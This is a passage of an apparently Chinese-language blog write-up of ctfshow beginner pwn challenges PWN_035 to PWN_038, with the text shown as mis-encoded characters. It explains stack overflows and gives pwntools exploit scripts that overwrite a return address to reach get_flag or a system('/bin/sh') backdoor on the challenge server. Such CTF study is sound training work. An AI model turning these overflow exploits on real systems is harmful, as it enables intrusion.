<p>IDAåˆ†æï¼Œé¢˜ç›®æè¿°ä¹Ÿè¯´äº†è¯¥ç¨‹åºåŒ…æ‹¬åŸºæœ¬çº§åˆ«çš„å®‰å…¨æ£€æŸ¥ï¼Œå¹¶æ·»åŠ äº†æ›´å¤šçš„æ£€æŸ¥ã€‚ åœ¨ç¼–è¯‘æ—¶è¿›è¡Œæ›´ä¸¥æ ¼çš„æ£€æŸ¥ï¼Œå¦‚æ›´ç²¾ç¡®çš„ç¼“å†²åŒºè¾¹ç•Œæ£€æŸ¥ã€‚ æä¾›æ›´ä¸°å¯Œçš„ç¼–è¯‘å™¨è­¦å‘Šå’Œé”™è¯¯ä¿¡æ¯ã€‚
ä½¿ç”¨ida64åç¼–è¯‘çš„åŠ è¿‡ç•¥å¾®ä¸å‰ä¸¤é“é¢˜ç›®æœ‰æ‰€ä¸åŒï¼Œå¤§éƒ¨åˆ†è¿˜æ˜¯ä¸€æ ·çš„ï¼Œè¿˜æ˜¯æŠŠå±é™©å‡½æ•°æ›¿æ¢æˆäº†å®‰å…¨å‡½æ•°ã€‚å¦‚ä¸‹ï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/94.png"
	width="814"
	height="505"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/94_hu_43f6bccc3a9f8aca.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/94_hu_7ea7c32cd0d7cfe1.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="161"
		data-flex-basis="386px"
	
></p>
<p>å¤§è‡´èƒ½çœ‹å‡ºåŸå‡½æ•°æ˜¯ä»€ä¹ˆå§ï¼Œè¿™é‡Œå°±ä¸å¤šè§£é‡Šäº†&hellip;</p>
<p># æ ¼å¼åŒ–å‡½æ•°ä¸è§£é¢˜æ“ä½œè¯´æ˜ <code>__printf__chk</code> å‡½æ•°ä¸ <code>printf</code> çš„åŒºåˆ«åœ¨äºï¼šä¸èƒ½ä½¿ç”¨ <code>%x$n</code> ä¸è¿ç»­åœ°æ‰“å°ï¼Œä¹Ÿå°±æ˜¯è¯´å¦‚æœè¦ä½¿ç”¨ <code>%3$n</code>ï¼Œåˆ™å¿…é¡»åŒæ—¶ä½¿ç”¨ <code>%1$n</code> å’Œ <code>%2$n</code>ã€‚åœ¨ä½¿ç”¨ <code>%n</code> çš„æ—¶å€™ä¼šåšä¸€äº›æ£€æŸ¥ã€‚ è¿™æ¶‰åŠåˆ°æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œä½†æœ¬é¢˜ä¸æ¶‰åŠæ­¤æ¼æ´ï¼Œæ‰€ä»¥å¯¹æœ¬é“é¢˜å‡ ä¹æ²¡æœ‰é˜»ç¢ã€‚åç»­æˆ‘ä»¬è¿˜æ˜¯é€šè¿‡ SSH è¿æ¥åè¿è¡Œæ–‡ä»¶ï¼Œè¾“å…¥ 4 ä¸ªé•¿åº¦ä¸º 1 çš„å‚æ•°ï¼Œä¸å‡ºæ„å¤–å°±èƒ½æ‹¿åˆ° flagï¼</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/95.png"
	width="1493"
	height="726"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/95_hu_b3792e7f70688569.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/95_hu_abc131af3d5d11c9.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="205"
		data-flex-basis="493px"
	
></p>
<h2 id="æ ˆæº¢å‡º">æ ˆæº¢å‡º
</h2><h3 id="pwn_035">PWN_035
</h3><p>é¢˜ç›®ï¼šæ­£å¼å¼€å§‹æ ˆæº¢å‡ºäº†ï¼Œå…ˆæ¥ä¸€ä¸ªæœ€æœ€æœ€æœ€ç®€å•çš„å§</p>
<p>ç”¨æˆ·åä¸º ctfshow å¯†ç  ä¸º 123456 è¯·ä½¿ç”¨ sshè½¯ä»¶è¿æ¥</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">ssh ctfshow@é¢˜ç›®åœ°å€ -pé¢˜ç›®ç«¯å£å·
</span></span></code></pre></td></tr></table>
</div>
</div><p>**ä¸æ˜¯ncè¿æ¥ **</p>
<p><a class="link" href="https://pan.baidu.com/s/1wHPhZ7XOouFU6KgyOiSfLQ"  target="_blank" rel="noopener"
    >ä¸“ç”¨è™šæ‹Ÿæœºé•œåƒï¼Œå…¨å¥—åœ¨è¿™é‡Œï¼Œæå–ç show</a></p>
<hr>
<p>checksecä¸€ä¸‹ï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/96.png"
	width="845"
	height="198"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/96_hu_5cec7781a9fafd95.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/96_hu_ceae71005b53e245.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="426"
		data-flex-basis="1024px"
	
></p>
<p>æ²¡å¼€canaryä¿æŠ¤ï¼Œå¯¹åº”äº†æœ¬ç« ä¸»é¢˜â€”â€”æ ˆæº¢å‡ºã€‚</p>
<p>IDAåˆ†æï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/97.png"
	width="1106"
	height="726"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/97_hu_8cfcbbb1f6ccb348.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/97_hu_894ff25413a0ac82.png 1024w"
	loading="lazy"
	
		alt="mainå‡½æ•°åç¼–è¯‘åˆ†æ"
	
	
		class="gallery-image" 
		data-flex-grow="152"
		data-flex-basis="365px"
	
></p>
<p>è·Ÿè¿›å‡½æ•°ï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/98.png"
	width="569"
	height="200"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/98_hu_7f17590d89865cd7.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/98_hu_492c2c611443a23c.png 1024w"
	loading="lazy"
	
		alt="sigsegv_handlerå‡½æ•°"
	
	
		class="gallery-image" 
		data-flex-grow="284"
		data-flex-basis="682px"
	
></p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/99.png"
	width="564"
	height="190"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/99_hu_64242a0110d6f688.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/99_hu_f5443b1ee09bc173.png 1024w"
	loading="lazy"
	
		alt="ctfshowå‡½æ•°"
	
	
		class="gallery-image" 
		data-flex-grow="296"
		data-flex-basis="712px"
	
></p>
<p>ç”±æ­¤å¯çŸ¥ï¼šctfshowå‡½æ•°å­˜åœ¨æ ˆæº¢å‡ºæ¼æ´ï¼Œè¶…è¿‡104å­—èŠ‚å°±ä¼šå‘ç”Ÿæ ˆæº¢å‡ºï¼›</p>
<p>å¯¹äº<code>SIGSEGV</code>å‡½æ•°ï¼Œå½“æ ˆæº¢å‡ºè§¦å‘ SIGSEGV æ—¶ï¼Œsigsegv_handler å‡½æ•°ä¼šè¢«è°ƒç”¨ï¼Œç„¶åè§¦å‘å‡½æ•°å†…éƒ¨â€”â€”fprintfæ‰“å°å‡ºflagå­—ç¬¦ä¸²ï¼Œä¹Ÿæ­£å¥½å¯¹åº”äº†fgetå‡½æ•°è¯»å–çš„flagå€¼ã€‚</p>
<blockquote class="alert alert-warn">
    <p>æ ˆæº¢å‡ºä¼šç ´åæ ˆä¸Šçš„ â€œè¿”å›åœ°å€â€â€œæ ˆå¸§ä¿¡æ¯â€ æˆ–å…¶ä»–å…³é”®å†…å­˜ç»“æ„ï¼Œæœ€ç»ˆå¼•å‘<strong>éæ³•å†…å­˜è®¿é—®</strong>ï¼ˆæ¯”å¦‚å‡½æ•°è¿”å›æ—¶è·³è½¬åˆ°æ— æ•ˆåœ°å€ï¼‰ï¼Œè§¦å‘ <code>SIGSEGV</code> ä¿¡å·ã€‚</p></blockquote>
<p>æ‰€ä»¥è¯´æˆ‘ä»¬åªè¦åœ¨è¿è¡Œçš„æ—¶å€™ç»™ç¨‹åºæ‰“å…¥è¶…è¿‡104ä¸ªçš„å­—ç¬¦ä¸²å°±å¥½ï¼Œå¯ä»¥æ˜¯105ä¸ªâ€œaâ€ã€‚</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/100.png"
	width="1235"
	height="555"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/100_hu_3fabc6f5bf3328d1.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/100_hu_28f40016a971c608.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="222"
		data-flex-basis="534px"
	
></p>
<h3 id="binshåœ°å€çš„è·³è½¬åˆ©ç”¨"><strong>/bin/shåœ°å€çš„è·³è½¬åˆ©ç”¨</strong>
</h3><p>ç›¸è¾ƒäº32ä½ç¨‹åºï¼Œ64 ä½ç¨‹åºè°ƒç”¨å‡½æ•°éœ€æ»¡è¶³ <strong>æ ˆå¯¹é½</strong>ï¼Œå› æ­¤æ„é€  payload æ—¶éœ€æ³¨æ„ï¼š</p>
<p>åœ¨å®é™…è§£é¢˜ä¸­ï¼Œ<code>ret</code> åœ°å€éœ€è¦é’ˆå¯¹å½“å‰é¢˜ç›®åŠ¨æ€è·å–ï¼Œç”¨ <code>ROPgadget</code> å·¥å…·ç›´æ¥æœç´¢ç¨‹åºä¸­çš„ <code>ret</code> æŒ‡ä»¤ï¼ˆæœ€å¸¸ç”¨ï¼‰ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ROPgadget --binary ./pwn <span class="p">|</span> grep ret
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="pwn_036">PWN_036
</h3><p>é¢˜ç›®ï¼šå­˜åœ¨åé—¨å‡½æ•°ï¼Œå¦‚ä½•åˆ©ç”¨ï¼Ÿ</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/101.png"
	width="826"
	height="231"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/101_hu_6afe63e25fe4af19.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/101_hu_ca0bed959ef72a10.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="357"
		data-flex-basis="858px"
	
></p>
<p>éå¸¸ä¸å®‰å…¨ï¼ï¼ï¼ï¼æ²¡æœ‰canaryä¿æŠ¤ã€‚å¯ä»¥ç”¨ret2shellcodeã€ret2libcã€‚</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/102.png"
	width="1225"
	height="506"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/102_hu_1ea758b340b9373a.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/102_hu_c4eefe935b6b6cf7.png 1024w"
	loading="lazy"
	
		alt="main-IDAçš„åˆ†æ"
	
	
		class="gallery-image" 
		data-flex-grow="242"
		data-flex-basis="581px"
	
></p>
<p>è¿™é¢˜å¼€å§‹æ€ªæ€ªçš„ï¼Œæ‰¾ä¸åˆ°/bin/shçš„åé—¨ï¼Œsigsegv_handler å‡½æ•°æ²¡æœ‰æˆ‘ä»¬æƒ³è¦çš„flagï¼Œä¸è¿‡åœ¨å·¦è¾¹å‡½æ•°ç›®å½•çœ‹åˆ°ç†Ÿæ‚‰çš„æ•…äººâ€”â€”get_flagå‡½æ•°ï¼Œç›´æ¥è·Ÿè¿›çœ‹çœ‹ï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/103.png"
	width="961"
	height="289"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/103_hu_ec17c27209d749fe.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/103_hu_ed5b527b98ddfd0f.png 1024w"
	loading="lazy"
	
		alt="è·Ÿè¿›get_flagå‡½æ•°"
	
	
		class="gallery-image" 
		data-flex-grow="332"
		data-flex-basis="798px"
	
></p>
<p>å¯ä»¥çœ‹åˆ°ä¸‹é¢çš„fgetsè¯»å–å’Œè¿”å›çš„printf(s)æ‰“å°å‡½æ•°ï¼Œè¾“å‡ºflagå­—ç¬¦ä¸²ï¼Œä¸»å‡½æ•°æ²¡æœ‰å¼•ç”¨å®ƒå•Šï¼Œæ€ä¹ˆåŠï¼Ÿæˆ‘ä»¬åªéœ€è¦åˆ©ç”¨æ ˆæº¢å‡ºæ¼æ´è¦†ç›–è¿”å›åœ°å€ï¼Œå°†ç¨‹åºçš„æ‰§è¡Œæµç¨‹è½¬å‘ get_flag å‡½æ•°ï¼Œä»è€Œè·å–flagã€‚ï¼ˆå¯ä»¥ç”¨ret2shellcodeã€ret2libcï¼‰</p>
<p>mainå‡½æ•°çš„çªç ´ç‚¹åœ¨è¿™ï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/104.png"
	width="860"
	height="215"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/104_hu_5cc36469a1fe2e12.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/104_hu_fcf805775837a51c.png 1024w"
	loading="lazy"
	
		alt="åœ¨mainè·Ÿè¿›ctfshowå‡½æ•°"
	
	
		class="gallery-image" 
		data-flex-grow="400"
		data-flex-basis="960px"
	
></p>
<p>æ²¡å¼€canaryä¿æŠ¤ï¼Œsæ•°ç»„å¯å­˜å‚¨å¤§å°èŒƒå›´æ˜¯36ï¼Œè¶…è¿‡äº†å°±è¦†ç›–è¿”å›åœ°å€äº†ã€‚</p>
<blockquote class="alert alert-error">
    <blockquote>
<p>gets è¯»å–å‡½æ•°æ˜¯éå¸¸ä¸å®‰å…¨çš„ï¼Œå®¹æ˜“å¯¼è‡´ç¼“å†²åŒºæº¢å‡ºæ¼æ´ã€‚å› ä¸ºå®ƒæ— æ³•é™åˆ¶è¾“å…¥çš„é•¿åº¦ï¼Œå¯èƒ½ä¼šè¶…å‡ºs æ•°ç»„çš„å®¹é‡ï¼Œå¯¼è‡´è¦†ç›–æ ˆä¸Šçš„å…¶ä»–æ•°æ®æˆ–æ‰§è¡Œä»»æ„ä»£ç ã€‚è¿™ä¹Ÿæ˜¯æ˜æ˜¾çš„æ ˆæº¢å‡ºæ¼æ´ï¼Œsè·ebpä»…æœ‰0x28ï¼Œè€Œgetsä¸é™åˆ¶è¾“å…¥é•¿åº¦ã€‚</p>
<p>å®‰å…¨æ€§æ¥çœ‹ä¸€èˆ¬éƒ½ä¼šç”¨fgetså‡½æ•°ï¼Œæ­é…<strong>FORTIFY ç¼“å†²åŒºè¾¹ç•Œæ£€æŸ¥</strong>æ¥æé«˜ç¨‹åºè‡ªèº«å®‰å…¨æ€§ã€‚</p>
</blockquote></blockquote>
<p>expï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;i386&#39;</span><span class="p">,</span><span class="n">os</span> <span class="o">=</span> <span class="s1">&#39;linux&#39;</span><span class="p">,</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;pwn.challenge.ctf.show&#39;</span><span class="p">,</span> <span class="mi">28297</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./pwn&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">get_flag_addr</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;get_flag&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span><span class="s1">&#39;A&#39;</span> <span class="o">*</span> <span class="mi">44</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">get_flag_addr</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span> <span class="c1">#è¿œç¨‹å‘é€</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>     <span class="c1">#å¼€å¯shelläº¤äº’æ¨¡å¼ï¼ˆç±»ä¼¼ç»ˆç«¯ï¼‰</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>è¿™é‡Œçš„44ä¸ªâ€˜aâ€™æ˜¯0x28 + 4 ï¼Œ0x28ï¼ˆåè¿›åˆ¶ 40ï¼‰æ˜¯ç¼“å†²åŒºåˆ° ebpï¼ˆæ ˆåŸºå€å¯„å­˜å™¨ï¼‰çš„è·ç¦»ï¼Œ+4 æ˜¯è¦†ç›– ebp æœ¬èº«ï¼ˆ32 ä½ç¨‹åºä¸­å¯„å­˜å™¨å  4 å­—èŠ‚ï¼‰ï¼Œæ€»å…± 44 å­—èŠ‚åï¼Œåç»­æ•°æ®æ‰èƒ½è¦†ç›–å‡½æ•°çš„ â€œè¿”å›åœ°å€â€ï¼Œä»è€Œè·³è½¬åˆ° get_flag å‡½æ•°ã€‚å½“ç„¶ä½ å¯ä»¥ç”¨cyclic(0x28 + 4)ï¼Œäº§ç”Ÿ44å­—èŠ‚çš„åƒåœ¾å€¼ã€‚</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/105.png"
	width="1130"
	height="569"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/105_hu_9fe21db2e56fb303.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/105_hu_2f03f58823b9acb.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="198"
		data-flex-basis="476px"
	
></p>
<h3 id="pwn_037">PWN_037
</h3><p>é¢˜ç›®ï¼š32ä½çš„ system(â€œ/bin/shâ€) åé—¨å‡½æ•°ç»™ä½ ã€‚</p>
<p>checksecå‘ç°æ˜¯æœ‰æ— æ ˆæº¢å‡ºä¿æŠ¤çš„ï¼Œå…³äº†canaryã€‚</p>
<p>IDAåˆ†æï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/106.png"
	width="649"
	height="204"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/106_hu_28baf5c7d68b2e77.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/106_hu_1e83db09825e803f.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="318"
		data-flex-basis="763px"
	
></p>
<p>å¯ä»¥å‘ç°mainå‡½æ•°æ²¡æœ‰ä»€ä¹ˆå¯ä»¥åˆ©ç”¨çš„ï¼Œä½†æ˜¯åœ¨å‡½æ•°ç›®å½•å¯ä»¥çœ‹åˆ°æœ‰ä¸ªbackdoorçš„å‡½æ•°æœ‰çŒ«è…»&hellip;.</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/107.png"
	width="689"
	height="309"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/107_hu_8a3f21dfb544f975.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/107_hu_82558c987e30e4e0.png 1024w"
	loading="lazy"
	
		alt="çœŸâ€œåé—¨â€å‡½æ•°â€”â€”backdoor"
	
	
		class="gallery-image" 
		data-flex-grow="222"
		data-flex-basis="535px"
	
></p>
<p>è¿™ä¸ªå‡½æ•°å±…ç„¶æœ‰/bin/shï¼ï¼ï¼ï¼ï¼</p>
<p>è·Ÿè¿›ctfshowå‡½æ•°ï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/108.png"
	width="685"
	height="149"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/108_hu_2f6decafcbb4d7a.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/108_hu_13e7ed272ddf4f58.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="459"
		data-flex-basis="1103px"
	
></p>
<p>æœ‰readè¯»å–å‡½æ•°ï¼Œé‚£æˆ‘ä»¬å¯ä»¥ä»¥æ­¤ä¸ºæ³¨å…¥ç‚¹ï¼Œç”¨åƒåœ¾å€¼0x12+4å…ˆè¦†ç›–å‡½æ•°å˜é‡å’Œå¯„å­˜å™¨ebpæœ¬èº«ï¼Œç„¶åå†ä¸Šä¼ ä¸€ä¸ªåé—¨å‡½æ•°çš„åœ°å€ã€‚</p>
<p>expï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;pwn.challenge.ctf.show&#39;</span><span class="p">,</span><span class="mi">28229</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./pwn&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">backdoor</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;backdoor&#39;</span><span class="p">]</span> <span class="c1">#åé—¨å‡½æ•°çš„åœ°å€</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">cyclic</span><span class="p">(</span><span class="mh">0x12</span> <span class="o">+</span> <span class="mi">4</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">backdoor</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/109.png"
	width="1043"
	height="460"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/109_hu_5594301dde95ce57.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/109_hu_f2393a4d4b100c98.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="226"
		data-flex-basis="544px"
	
></p>
<p>è„šæœ¬expä¸‡å²ã€‚</p>
<h3 id="pwn_038">PWN_038
</h3><p>é¢˜ç›®ï¼š64ä½çš„ system(â€œ/bin/shâ€) åé—¨å‡½æ•°ç»™ä½ ã€‚</p>
<p>checksecï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/110.png"
	width="845"
	height="209"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/110_hu_cc699b9c9e84b874.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/110_hu_818237d793c59893.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="404"
		data-flex-basis="970px"
	
></p>
<p>æ²¡å¼€canaryä¿æŠ¤ï¼Œå¼€NXä¿æŠ¤ï¼ˆä¸èƒ½ret2shellcodeï¼‰</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/111.png"
	width="653"
	height="150"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/111_hu_557177fc9847835c.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/111_hu_3e2e3f6328afcdc.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="435"
		data-flex-basis="1044px"
	
></p>
<p>bufæ•°ç»„è·ç¦»ebpå¯„å­˜å™¨ä¸º0xAhï¼ŒåŠ ä¸Šæœ¬èº«å¯„å­˜å™¨ebpçš„8å­—èŠ‚ã€‚</p>
<p>è·Ÿè¿›backdoorå‡½æ•°çœ‹åˆ°/bin/shï¼Œæœ¬é¢˜æ€è·¯å’Œä¸Šé¢˜PWN_037ä¸€æ ·ï¼Œåªä¸è¿‡æ¶æ„å˜æˆ64ä½è€Œå·²ã€‚</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/107.png"
	width="689"
	height="309"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/107_hu_8a3f21dfb544f975.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/107_hu_82558c987e30e4e0.png 1024w"
	loading="lazy"
	
		alt="ä¸Šé¢˜backdoorå‡½æ•°çš„intç±»å‹"
	
	
		class="gallery-image" 
		data-flex-grow="222"
		data-flex-basis="535px"
	
></p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/112.png"
	width="610"
	height="126"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/112_hu_7a50666a6534a184.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/112_hu_f2c44b968d3f43b7.png 1024w"
	loading="lazy"
	
		alt="æœ¬é¢˜çš„åé—¨å‡½æ•°int_64"
	
	
		class="gallery-image" 
		data-flex-grow="484"
		data-flex-basis="1161px"
	
></p>
<blockquote class="alert alert-note">
    <blockquote>
<p>64 ä½ç¨‹åºè°ƒç”¨ <code>system</code> éœ€è€ƒè™‘å †æ ˆå¹³è¡¡ï¼Œæœ¬è´¨æ˜¯ <strong>64 ä½ ABI å¯¹ â€œæ ˆå¯¹é½â€ çš„ç¡¬æ€§è¦æ±‚</strong>â€”â€” è‹¥ä¸æ»¡è¶³ï¼Œå‡½æ•°æ‰§è¡Œæ—¶è®¿é—®æ ˆå†…å­˜ä¼šå´©æºƒï¼›è€Œ 32 ä½ ABI æ— æ­¤è¦æ±‚ï¼Œä»…éœ€è°ƒç”¨åæ¸…ç†å‚æ•°æ ˆå³å¯ï¼Œå› æ­¤æ— éœ€é¢å¤–å…³æ³¨å¹³è¡¡ã€‚</p>
</blockquote></blockquote>
<p>æ‰€ä»¥è¯´expéœ€è¦è€ƒè™‘åˆ°å †æ ˆå¹³è¡¡åŠ ä¸Šretè¿”å›åœ°å€ï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/113.png"
	width="1198"
	height="261"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/113_hu_3770565c136ecdbb.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/113_hu_f3c84935d209b6bf.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="459"
		data-flex-basis="1101px"
	
></p>
<p>åœ¨å®é™…è§£é¢˜ä¸­ï¼Œ<code>ret</code> åœ°å€éœ€è¦é’ˆå¯¹å½“å‰é¢˜ç›®åŠ¨æ€è·å–ï¼Œå¸¸ç”¨æ–¹æ³•ï¼š</p>
<p><strong>å·¥å…·æŸ¥æ‰¾</strong>ï¼šç”¨ <code>ROPgadget</code> å·¥å…·ç›´æ¥æœç´¢ç¨‹åºä¸­çš„ <code>ret</code> æŒ‡ä»¤ï¼ˆæœ€å¸¸ç”¨ï¼‰ï¼š</p>
<div class="highlight"><div class="chroma">
